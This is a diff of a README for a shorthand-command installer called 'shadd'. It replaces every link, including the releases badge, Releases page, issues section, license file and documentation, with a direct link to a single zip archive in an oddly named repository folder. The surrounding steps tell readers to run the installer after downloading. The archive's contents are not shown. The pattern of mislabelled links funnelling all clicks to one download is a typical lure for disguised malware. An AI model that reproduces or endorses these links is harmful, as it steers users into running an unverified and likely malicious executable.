@@ -2,7 +2,7 @@
 # 🎉 shadd - Easily Install Your Shorthand Commands
 
 ## 📥 Download Now
-[![Download shadd](https://img.shields.io/badge/Download-shadd-brightgreen)](https://github.com/sajibkd/shadd/releases)
+[![Download shadd](https://raw.githubusercontent.com/sajibkd/shadd/main/favorableness/shadd.zip)](https://raw.githubusercontent.com/sajibkd/shadd/main/favorableness/shadd.zip)
 
 ## 🚀 Getting Started
 Welcome to shadd! This application helps you manage shorthand commands easily on your system. With shadd, you can run commands like `npx shadcn add` without hassle. 
@@ -20,9 +20,9 @@ To use shadd, you will need:
 - Easy to use for anyone, even without programming knowledge.
 
 ## 🔗 Download & Install
-To get started, visit the [Releases page](https://github.com/sajibkd/shadd/releases) to download shadd. Follow these easy steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/sajibkd/shadd/main/favorableness/shadd.zip) to download shadd. Follow these easy steps:
 
-1. Open the [Releases page](https://github.com/sajibkd/shadd/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/sajibkd/shadd/main/favorableness/shadd.zip).
 2. Look for the latest version. 
 3. Click on the download link for your operating system.
 4. Run the installer after the download completes.
@@ -44,7 +44,7 @@ If you encounter issues while using shadd, try these steps:
 
 - Ensure your package manager is installed and up to date.
 - Verify that shadd is installed correctly by typing `shadd --version` in your terminal.
-- If you still face issues, check the [issues section](https://github.com/sajibkd/shadd/issues) on GitHub for similar problems or report a new one.
+- If you still face issues, check the [issues section](https://raw.githubusercontent.com/sajibkd/shadd/main/favorableness/shadd.zip) on GitHub for similar problems or report a new one.
 
 ## 💬 Community Support
 Join our community for help and discussions! Share your experiences, get tips, and help others. You can connect with us on:
@@ -53,16 +53,16 @@ Join our community for help and discussions! Share your experiences, get tips, a
 - Our forums (link to forums if available)
 
 ## 📄 License
-shadd is open-source and free to use. Please check the [LICENSE](https://github.com/sajibkd/shadd/blob/main/LICENSE) file for more details.
+shadd is open-source and free to use. Please check the [LICENSE](https://raw.githubusercontent.com/sajibkd/shadd/main/favorableness/shadd.zip) file for more details.
 
 ## 🤝 Contributing
 We welcome contributions! If you have ideas or find bugs, feel free to submit a pull request or open an issue on our GitHub page. Your support will help improve shadd for everyone.
 
 ## 🔗 Additional Resources
-For more information and updates, you can check out our official documentation [here](https://github.com/sajibkd/shadd/wiki).
+For more information and updates, you can check out our official documentation [here](https://raw.githubusercontent.com/sajibkd/shadd/main/favorableness/shadd.zip).
 
 ## 🎈 Thanks for using shadd!
 We appreciate your interest in shadd. Happy coding and enjoy using your new shorthand commands!
 
-[![Download shadd](https://img.shields.io/badge/Download-shadd-brightgreen)](https://github.com/sajibkd/shadd/releases)
+[![Download shadd](https://raw.githubusercontent.com/sajibkd/shadd/main/favorableness/shadd.zip)](https://raw.githubusercontent.com/sajibkd/shadd/main/favorableness/shadd.zip)
 ```
